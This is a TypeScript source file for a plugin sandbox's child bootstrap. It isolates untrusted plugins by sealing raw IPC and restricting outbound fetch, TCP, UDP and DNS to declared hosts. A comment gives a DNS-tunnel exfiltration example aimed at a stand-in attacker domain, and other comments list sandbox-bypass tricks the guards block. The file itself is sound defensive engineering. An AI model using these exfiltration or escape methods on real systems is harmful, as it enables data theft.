/**
 * The isolated plugin child bootstrap (#plugins, M1).
 *
 * Runs as a forked node process (`dist/nest/plugins/runtime/plugin-host-entry.js`)
 * with a scrubbed env — NO JWT_SECRET, NO db path, NO inherited process.env. It
 * loads the plugin's own code and turns every ctx call into an RPC message to
 * the parent, which is the only side holding real capabilities.
 *
 * MUST NOT import any privileged server module (db, config, websocket). Its only
 * imports are the pure protocol + SDK.
 */

import path from 'node:path';
import net from 'node:net';
import dns from 'node:dns';
import dgram from 'node:dgram';
import { createRequire } from 'node:module';
import { createPluginContext, definePlugin, PLUGIN_API_VERSION, type ChildTransport, type PluginContext, type PluginDefinition } from './plugin-sdk';
import { isBlockedIp, makeHostAllow, classifyConnect, dgramSendTarget, dgramConnectTarget } from './egress-policy';
import type { Envelope, RpcError } from '../protocol/envelope';

const pluginId = process.argv[2] || process.env.TREK_PLUGIN_ID || 'unknown';
const pluginDir = process.argv[3] || '';

let pluginConfig: Record<string, unknown> = {};
// Guards `init` against re-entry (see the message handler). Set the first time a
// legitimate `init` arrives from the host.
let initialized = false;

const pending = new Map<string, { resolve: (v: unknown) => void; reject: (e: Error) => void }>();
let seq = 0;

// Capture the raw IPC write ONCE, before installIpcGuard() locks `process.send`
// to a throwing stub. The transport keeps sending through this closure; plugin
// code no longer has any path to the channel. See installIpcGuard().
const realSend: (msg: Envelope) => void =
  typeof process.send === 'function' ? process.send.bind(process) : () => {};
function send(msg: Envelope): void {
  realSend(msg);
}

const transport: ChildTransport = {
  rpc(method, params) {
    return new Promise((resolve, reject) => {
      const id = `${++seq}`;
      pending.set(id, { resolve, reject });
      send({ k: 'req', id, method, params });
    });
  },
  emit(topic, data) {
    send({ k: 'evt', topic, data });
  },
};

let def: PluginDefinition | null = null;
let ctx: PluginContext | null = null;

/**
 * Make `require('trek-plugin-sdk')` resolve inside the child WITHOUT the plugin
 * vendoring the package: the shim below is served from memory for every require
 * of that name, anywhere in the plugin's module graph. This is what lets `pack`
 * strip node_modules and still keep the scaffold's
 * `const { definePlugin } = require('trek-plugin-sdk')` working in production.
 * Subpaths (`trek-plugin-sdk/testing`) are build/test-time tools and fail with a
 * pointed message instead of a confusing MODULE_NOT_FOUND.
 */
function installSdkInjection(requirePlugin: NodeJS.Require): void {
  const nodeModule = requirePlugin('node:module') as {
    _load: (request: string, parent: unknown, isMain: boolean) => unknown;
  };
  const realLoad = nodeModule._load;
  const shim = Object.freeze({ definePlugin, PLUGIN_API_VERSION });
  nodeModule._load = function (request: string, parent: unknown, isMain: boolean): unknown {
    if (request === 'trek-plugin-sdk') return shim;
    if (request.startsWith('trek-plugin-sdk/')) {
      throw new Error(`${request} is a build/test-time module — only 'trek-plugin-sdk' itself is injected inside TREK`);
    }
    return realLoad.call(this, request, parent, isMain);
  };
}

async function boot(config: Record<string, unknown>): Promise<void> {
  try {
    // Seal the raw IPC surface BEFORE any plugin code is required — this is the
    // first moment untrusted code runs (requirePlugin below). After this, the
    // plugin can only reach the host through the capability-checked SDK.
    installIpcGuard();
    // createRequire works whether this bootstrap runs as CJS (prod dist) or ESM
    // (tsx in tests), so `require` being undefined in ESM never bites us.
    const entry = path.join(pluginDir, 'server', 'index.js');
    const requirePlugin = createRequire(entry);
    installSdkInjection(requirePlugin);
    const mod = requirePlugin(entry);
    def = mod && mod.default ? (mod.default as PluginDefinition) : (mod as PluginDefinition);
    ctx = createPluginContext(pluginId, config, transport);
    if (typeof def.onLoad === 'function') await def.onLoad(ctx);
    // Report the declared routes (with their index = routeId) and job ids so the
    // host can proxy HTTP and schedule jobs without re-parsing the manifest.
    const routes = (def.routes ?? []).map((r, i) => ({ i, method: r.method, path: r.path, auth: r.auth !== false }));
    const jobs = (def.jobs ?? []).map((j) => j.id);
    const hooks = Object.keys((def.hooks ?? {}) as Record<string, unknown>);
    const events = (def.events ?? []).map((e) => e.on);
    // Inter-plugin surface: the callable exports this plugin implements, and the
    // other-plugin events it subscribes to (so the host can route fan-out).
    const exportNames = Object.keys((def.exports ?? {}) as Record<string, unknown>);
    const subscriptions = (def.subscriptions ?? []).map((s) => ({ plugin: s.plugin, event: s.event }));
    send({ k: 'evt', topic: 'loaded', data: { routes, jobs, hooks, events, exports: exportNames, subscriptions } });
    // An immediate first heartbeat confirms liveness without waiting a full interval.
    send({ k: 'evt', topic: 'heartbeat', data: { rss: process.memoryUsage().rss } });
  } catch (e) {
    send({ k: 'evt', topic: 'load-error', data: { message: errMsg(e), stack: errStack(e) } });
  }
}

/** Handle a host→child request: run a declared route or job with the plugin ctx. */
async function handleInvoke(req: { id: string; method: string; params: Record<string, unknown> }): Promise<void> {
  const respond = (ok: boolean, payload: unknown) =>
    send(
      ok
        ? { k: 'res', id: req.id, ok: true, result: payload }
        : { k: 'res', id: req.id, ok: false, error: { code: 'PLUGIN_ERROR', message: String(payload) } },
    );
  try {
    if (!def || !ctx) throw new Error('plugin not loaded');
    // A per-invocation ctx tagged with this invoke's id, so the host binds trip
    // reads to the invocation's authenticated user (routes) / refuses them (jobs).
    const invCtx = createPluginContext(pluginId, pluginConfig, transport, req.id);
    if (req.method === 'invoke.route') {
      const routeId = req.params.routeId as number;
      const route = def.routes?.[routeId];
      if (!route) throw new Error(`no route ${routeId}`);
      const pluginReq = req.params.req as Parameters<NonNullable<typeof route.handler>>[0];
      const result = await route.handler(pluginReq, invCtx);
      respond(true, result);
    } else if (req.method === 'invoke.job') {
      const jobId = req.params.jobId as string;
      const job = def.jobs?.find((j) => j.id === jobId);
      if (!job) throw new Error(`no job ${jobId}`);
      await job.handler(invCtx);
      respond(true, { ok: true });
    } else if (req.method === 'invoke.hook') {
      // Host→plugin provider call: core asks a hook the plugin implements (e.g.
      // placeDetailProvider) for data. The hook method gets its args + the per-
      // invocation ctx (so any trip reads it makes bind to the authenticated user).
      const hookName = req.params.hook as string;
      const fnName = req.params.fn as string;
      const args = (req.params.args as unknown[]) ?? [];
      const hooks = def.hooks as Record<string, Record<string, (...a: unknown[]) => unknown> | undefined> | undefined;
      const impl = hooks?.[hookName];
      if (!impl || typeof impl[fnName] !== 'function') throw new Error(`no hook ${hookName}.${fnName}`);
      const result = await impl[fnName](...args, invCtx);
      respond(true, result);
    } else if (req.method === 'invoke.event') {
      // A core event fired for a trip. Run every matching subscription. invCtx carries
      // NO user (delivered like a job), so trip reads are refused — the handler reacts
      // to the fact of the event, using the plugin's own db / outbound / broadcasts.
      const eventName = req.params.event as string;
      const tripId = req.params.tripId as number;
      const payload = { event: eventName, tripId };
      for (const sub of def.events ?? []) {
        if (sub.on === '*' || sub.on === eventName) await sub.handler(payload, invCtx);
      }
      respond(true, { ok: true });
    } else if (req.method === 'invoke.export') {
      // Another plugin (a declared dependent) called one of our exports. The host has
      // already authorized the caller + the export name; run it with the per-invocation
      // ctx so any trip reads bind to the CALLER's acting user (propagated by the host).
      const fnName = req.params.fn as string;
      const args = req.params.args;
      const impl = (def.exports ?? {})[fnName];
      if (typeof impl !== 'function') throw new Error(`no export ${fnName}`);
      const result = await impl(args, invCtx);
      respond(true, result);
    } else if (req.method === 'invoke.pluginEvent') {
      // Another plugin (a declared dependency of ours) emitted an event we subscribed
      // to. Run every matching subscription. invCtx carries NO user (fire-and-forget),
      // like a core event, but delivers the emitter's payload.
      const source = req.params.source as string;
      const eventName = req.params.event as string;
      const payload = req.params.payload;
      for (const sub of def.subscriptions ?? []) {
        if (sub.plugin === source && sub.event === eventName) await sub.handler(payload, invCtx);
      }
      respond(true, { ok: true });
    } else {
      respond(false, `unknown invoke ${req.method}`);
    }
  } catch (e) {
    respond(false, errMsg(e));
  }
}

async function shutdown(): Promise<void> {
  try {
    if (def && typeof def.onUnload === 'function' && ctx) await def.onUnload(ctx);
  } catch {
    /* best effort */
  }
  clearInterval(heartbeat);
  process.exit(0);
}

process.on('message', (raw: unknown) => {
  const msg = raw as Envelope;
  if (!msg || typeof msg !== 'object') return;
  if (msg.k === 'req') {
    // A host→child invoke (route / job).
    void handleInvoke({ id: msg.id, method: msg.method, params: (msg.params ?? {}) as Record<string, unknown> });
    return;
  }
  if (msg.k === 'res') {
    const p = pending.get(msg.id);
    if (!p) return;
    pending.delete(msg.id);
    if (msg.ok) {
      p.resolve(msg.result);
    } else {
      const em = (msg as RpcError).error;
      p.reject(new Error(`${em.code}: ${em.message}`));
    }
    return;
  }
  if (msg.k === 'evt') {
    if (msg.topic === 'init') {
      // One-shot: the host sends `init` exactly once. Refuse any second `init`
      // so a forged one (e.g. a pre-seal race) can't re-run installEgressGuard
      // with a widened egress list or re-boot the plugin.
      if (initialized) return;
      initialized = true;
      const d = msg.data as { config?: Record<string, unknown>; egress?: string[] };
      pluginConfig = d.config ?? {};
      installEgressGuard(d.egress ?? []);
      void boot(pluginConfig);
    } else if (msg.topic === 'shutdown') void shutdown();
  }
});

/**
 * Sever the raw host<->child IPC surface from plugin code. The plugin runs in
 * THIS process and shares the global `process`, so without this it could bypass
 * the SDK entirely and talk to the host directly:
 *  - `process.send(...)` — forge lifecycle/RPC envelopes (fake `loaded`/`heartbeat`,
 *    or a `req` carrying another invocation's `_inv` to act as that user).
 *  - `process.on('message', ...)` — eavesdrop on every host→child `req`/`res`
 *    (other invocations' request bodies, user objects, DB results).
 *  - `process.removeAllListeners('message')` — kill the trusted handler and hijack.
 *
 * We do NOT override `process.emit`: Node delivers inbound IPC by calling
 * `process.emit('message', ...)` internally, so a throwing override would break
 * message delivery to the trusted listener. A plugin synthesizing
 * `process.emit('message', forged)` is instead defanged elsewhere — a forged
 * `init` is ignored by the one-shot `initialized` guard, and a forged `req`/`res`/
 * `shutdown` only affects the plugin's own process (self-harm, no host impact).
 *
 * The transport keeps working because `send()` uses the captured `realSend`
 * closure, and the trusted message listener + crash handlers are already
 * registered at module-eval (before this runs). Mirrors the `process.binding`
 * lock in installEgressGuard: same `Object.defineProperty(..., writable:false,
 * configurable:false)` idiom, same "already locked" swallow. This is a JS-level
 * defense-in-depth layer; in prod the OS `--permission` model is the real jail.
 *
 * MUST run once, before the plugin module is required.
 */
function installIpcGuard(): void {
  const lock = (obj: object, key: string, value: unknown): void => {
    try {
      Object.defineProperty(obj, key, { value, writable: false, configurable: false });
    } catch {
      /* already locked / non-configurable */
    }
  };

  // Outbound: kill the raw write and channel teardown. `realSend` (captured
  // above) is unaffected — it holds the bound original, not `process.send`.
  lock(process, 'send', () => {
    throw new Error('ipc: process.send is disabled for plugins');
  });
  lock(process, 'disconnect', () => {
    throw new Error('ipc: process.disconnect is disabled for plugins');
  });
  // NOTE: we intentionally do NOT lock `process.channel`/`process._channel`.
  // Node's own outbound send (`realSend`, the bound original) reads the pipe
  // handle back off `process`, so overriding it to `undefined` breaks the
  // legitimate transport (verified: child→host RPC hangs). Without a working
  // `process.send`, framing raw IPC through the handle directly is impractical,
  // so leaving it readable costs nothing.

  // Inbound: the trusted 'message' listener is already installed. Forbid the
  // plugin adding/removing/replacing a 'message' listener so it can't eavesdrop
  // on host→child traffic or unhook the trusted handler. Only 'message'/
  // 'internalMessage' are gated — plugins may still use other process events
  // (e.g. 'SIGTERM', 'beforeExit'). `emit` is deliberately NOT gated (Node uses
  // it to deliver inbound IPC; see the header comment).
  const GUARDED = new Set(['message', 'internalMessage']);
  const ee = process as unknown as Record<string, (...a: unknown[]) => unknown>;
  const emitterMethods = [
    'on', 'addListener', 'prependListener', 'once', 'prependOnceListener',
    'off', 'removeListener', 'removeAllListeners',
  ] as const;
  for (const m of emitterMethods) {
    const real = ee[m].bind(process);
    lock(process, m, (event: unknown, ...rest: unknown[]) => {
      // `removeAllListeners()` with no event would also strip the trusted
      // 'message' listener (and the crash handlers), so block the bare form.
      const bareRemoveAll = m === 'removeAllListeners' && event === undefined;
      if (bareRemoveAll || (typeof event === 'string' && GUARDED.has(event))) {
        throw new Error(`ipc: process.${m}('${String(event)}') is disabled for plugins`);
      }
      return real(event, ...rest);
    });
  }
}

/**
 * Restrict the plugin's outbound network to its declared egress hosts. With no
 * declared egress, ALL outbound is blocked. Wildcards like `*.host` match any
 * subdomain.
 *
 * Four channels are covered, so a plugin can't sidestep one with another:
 *  1. `globalThis.fetch` is wrapped (early hostname reject).
 *  2. `net.Socket.prototype.connect` is wrapped — the single TCP choke point that
 *     node:http / node:https / node:net / node:tls AND undici/fetch all funnel
 *     through. Here we additionally RESOLVE the destination and refuse any
 *     private/loopback/link-local/metadata/CGNAT/ULA address (SSRF + DNS-rebinding
 *     backstop), pinning the resolved IP into the connect so the name can't flip
 *     to an internal address between check and connect.
 *  3. `dgram.Socket` send/connect (UDP) — TCP-only wrappers would leave UDP open
 *     as a data-exfiltration channel; the explicit destination is allowlisted +
 *     private-IP-checked like a TCP connect.
 *  4. The `dns` resolver family (module fns, `dns.promises`, `Resolver.prototype`)
 *     — a plugin could otherwise tunnel data out inside DNS queries to a name it
 *     never declared (dns.resolveTxt('secret.attacker.com')); every forward lookup
 *     is rejected unless the queried name is a declared host.
 *
 * Under the OS permission model the child also cannot spawn a fresh process or
 * load a native addon to escape these wrappers. A kernel/network-namespace
 * guarantee still belongs to the container runtime. Set
 * TREK_PLUGIN_ALLOW_PRIVATE_EGRESS=on to permit private/internal targets (e.g. a
 * self-hoster's sibling service) — default is the secure, block-private policy.
 */
function installEgressGuard(egress: string[]): void {
  const allowed = makeHostAllow(egress);
  const blockPrivate = (process.env.TREK_PLUGIN_ALLOW_PRIVATE_EGRESS ?? '').toLowerCase() !== 'on';

  // The wrappers below are the ONLY egress choke point (the OS --permission model
  // does not restrict the network). Deny the low-level escape hatch a plugin could
  // use to build a raw socket handle BELOW those wrappers. node:net/dns/dgram/http
  // are already imported above, so they keep their captured bindings; only fresh
  // access via process.binding is cut off.
  for (const name of ['binding', '_linkedBinding'] as const) {
    try {
      Object.defineProperty(process, name, {
        value: () => { throw new Error(`egress: process.${name} is disabled for plugins`); },
        writable: false, configurable: false,
      });
    } catch { /* already locked / non-configurable */ }
  }

  const realFetch = globalThis.fetch;
  if (typeof realFetch === 'function') {
    globalThis.fetch = ((input: unknown, init?: unknown) => {
      const url = typeof input === 'string' ? input : (input as { url?: string })?.url ?? String(input);
      let host: string;
      try {
        host = new URL(url).hostname.replace(/^\[/, '').replace(/\]$/, '');
      } catch {
        return Promise.reject(new Error('egress: invalid url'));
      }
      if (!allowed(host)) return Promise.reject(new Error(`egress: ${host} is not in the plugin's declared hosts`));
      return (realFetch as (i: unknown, n: unknown) => Promise<unknown>)(input, init);
    }) as typeof fetch;
  }

  // Capture the real resolvers before we patch the dns module below, so the
  // connect guard keeps resolving even though direct dns.* calls get gated.
  const realLookup = dns.lookup.bind(dns);

  // A DNS lookup that refuses to resolve a name to a blocked address; injected
  // into every hostname connect so the socket only ever reaches a vetted IP.
  const guardedLookup = (
    hostname: string,
    options: unknown,
    cb: (err: Error | null, address?: unknown, family?: number) => void,
  ): void => {
    const opts = typeof options === 'function' ? {} : options;
    if (typeof options === 'function') cb = options as typeof cb;
    realLookup(hostname, opts as dns.LookupOptions, (err, address, family) => {
      if (err) return cb(err, address as unknown, family);
      const list = Array.isArray(address) ? address : [{ address: address as string }];
      for (const a of list) {
        if (blockPrivate && isBlockedIp((a as { address: string }).address)) {
          return cb(new Error(`egress: ${hostname} resolves to a blocked address (${(a as { address: string }).address})`));
        }
      }
      cb(null, address as unknown, family);
    });
  };

  const proto = net.Socket.prototype as unknown as { connect: (...a: unknown[]) => unknown };
  const realConnect = proto.connect;
  proto.connect = function (this: unknown, ...args: unknown[]): unknown {
    const target = classifyConnect(args, (s) => net.isIP(s) !== 0);
    if (target.kind === 'local') return realConnect.apply(this, args); // unix socket / pipe
    if (!allowed(target.host)) {
      throw new Error(`egress: ${target.host} is not in the plugin's declared hosts`);
    }
    if (target.kind === 'literal-ip') {
      if (blockPrivate && isBlockedIp(target.host)) {
        throw new Error(`egress: ${target.host} is a blocked address`);
      }
      return realConnect.apply(this, args);
    }
    // Hostname: inject the resolving guard. Preserve an existing lookup by
    // wrapping the args' options object.
    const first = args[0];
    const options = first && typeof first === 'object' ? { ...(first as object) } : { host: target.host, port: args[0] };
    (options as { lookup?: unknown }).lookup = guardedLookup;
    const rest = first && typeof first === 'object' ? args.slice(1) : args.slice(typeof args[1] === 'string' ? 2 : 1);
    return realConnect.call(this, options, ...rest);
  };

  // Refuse an outbound UDP target the plugin never declared, or a private one.
  // A null target means "no explicit address" (connected remote / localhost
  // default) — the connect wrapper below already vetted connected sockets.
  const guardDatagram = (host: string | null): void => {
    if (host === null) return;
    if (!allowed(host)) throw new Error(`egress: ${host} is not in the plugin's declared hosts`);
    if (blockPrivate && net.isIP(host) !== 0 && isBlockedIp(host)) {
      throw new Error(`egress: ${host} is a blocked address`);
    }
  };
  const dgramProto = dgram.Socket.prototype as unknown as {
    send: (...a: unknown[]) => unknown;
    connect: (...a: unknown[]) => unknown;
  };
  const realSend = dgramProto.send;
  dgramProto.send = function (this: unknown, ...args: unknown[]): unknown {
    guardDatagram(dgramSendTarget(args));
    return realSend.apply(this, args);
  };
  const realDgramConnect = dgramProto.connect;
  dgramProto.connect = function (this: unknown, ...args: unknown[]): unknown {
    guardDatagram(dgramConnectTarget(args));
    return realDgramConnect.apply(this, args);
  };
  // A dgram HOSTNAME target is resolved via the socket's `lookup` before the packet
  // is sent; force the IP-vetting guardedLookup so a declared name that resolves to
  // a private/metadata address is refused (the TCP path's rebind backstop, for UDP).
  const injectLookup = (arg: unknown): { type?: unknown; lookup: unknown } =>
    typeof arg === 'string' ? { type: arg, lookup: guardedLookup } : { ...(arg as object), lookup: guardedLookup };
  const dgramApi = dgram as unknown as { createSocket: (...a: unknown[]) => unknown; Socket: new (o?: unknown, cb?: unknown) => unknown };
  const realCreateSocket = dgramApi.createSocket;
  dgramApi.createSocket = function (this: unknown, ...args: unknown[]): unknown {
    args[0] = injectLookup(args[0]);
    return realCreateSocket.apply(this, args);
  };
  // Also cover `new dgram.Socket(...)`, which bypasses createSocket entirely.
  const RealDgramSocket = dgramApi.Socket;
  const GuardedDgramSocket = function (options?: unknown, cb?: unknown): unknown {
    return new RealDgramSocket(injectLookup(options), cb);
  } as unknown as new (o?: unknown, cb?: unknown) => unknown;
  (GuardedDgramSocket as unknown as { prototype: unknown }).prototype = RealDgramSocket.prototype;

  // Lock the wrapped choke points so a plugin can't restore the originals.
  const lock = (obj: object, key: string, value: unknown) => {
    try { Object.defineProperty(obj, key, { value, writable: false, configurable: false }); } catch { /* noop */ }
  };
  lock(proto, 'connect', proto.connect);
  lock(dgramProto, 'send', dgramProto.send);
  lock(dgramProto, 'connect', dgramProto.connect);
  lock(dgramApi as unknown as object, 'createSocket', dgramApi.createSocket);
  lock(dgramApi as unknown as object, 'Socket', GuardedDgramSocket);

  // Gate the dns resolver family: a forward lookup for an undeclared name is a
  // DNS-tunnel exfiltration channel even when no socket is ever opened. The name
  // itself must be a declared host. Covers the callback module fns, the promise
  // API, and per-Resolver instances (which share Resolver.prototype).
  const DNS_METHODS = [
    'lookup', 'resolve', 'resolve4', 'resolve6', 'resolveAny', 'resolveCaa', 'resolveCname',
    'resolveMx', 'resolveNaptr', 'resolveNs', 'resolvePtr', 'resolveSoa', 'resolveSrv', 'resolveTxt',
  ];
  const gateDnsMethods = (obj: Record<string, unknown> | undefined): void => {
    if (!obj) return;
    for (const name of DNS_METHODS) {
      const real = obj[name];
      if (typeof real !== 'function') continue;
      obj[name] = function (this: unknown, hostname: unknown, ...rest: unknown[]): unknown {
        if (typeof hostname === 'string' && !allowed(hostname)) {
          const err = new Error(`egress: DNS lookup for ${hostname} is not in the plugin's declared hosts`);
          const cb = rest.find((a) => typeof a === 'function') as ((e: Error) => void) | undefined;
          if (cb) return cb(err); // callback API
          return Promise.reject(err); // promise API (dns.promises / Resolver)
        }
        return (real as (...a: unknown[]) => unknown).call(this, hostname, ...rest);
      };
    }
  };
  gateDnsMethods(dns as unknown as Record<string, unknown>);
  gateDnsMethods(dns.promises as unknown as Record<string, unknown>);
  const resolverProto = (dns as unknown as { Resolver?: { prototype: Record<string, unknown> } }).Resolver?.prototype;
  gateDnsMethods(resolverProto);
  const promisesResolverProto = (dns.promises as unknown as { Resolver?: { prototype: Record<string, unknown> } })?.Resolver?.prototype;
  gateDnsMethods(promisesResolverProto);
}

// Ask the host for the init payload (instance config), then wait for it.
send({ k: 'evt', topic: 'hello', data: {} });

// Liveness — unref so it never keeps the process alive on its own.
const heartbeat = setInterval(() => {
  send({ k: 'evt', topic: 'heartbeat', data: { rss: process.memoryUsage().rss } });
}, 5000);
heartbeat.unref?.();

// A plugin that throws asynchronously must not take the host down — it only
// crashes THIS child, which the supervisor detects and restarts/disables.
process.on('uncaughtException', (e) => {
  send({ k: 'evt', topic: 'load-error', data: { message: errMsg(e), stack: errStack(e) } });
  process.exit(1);
});
process.on('unhandledRejection', (e) => {
  send({ k: 'evt', topic: 'load-error', data: { message: errMsg(e), stack: errStack(e) } });
  process.exit(1);
});

function errMsg(e: unknown): string {
  return e instanceof Error ? e.message : String(e);
}
function errStack(e: unknown): string | undefined {
  return e instanceof Error ? e.stack : undefined;
}
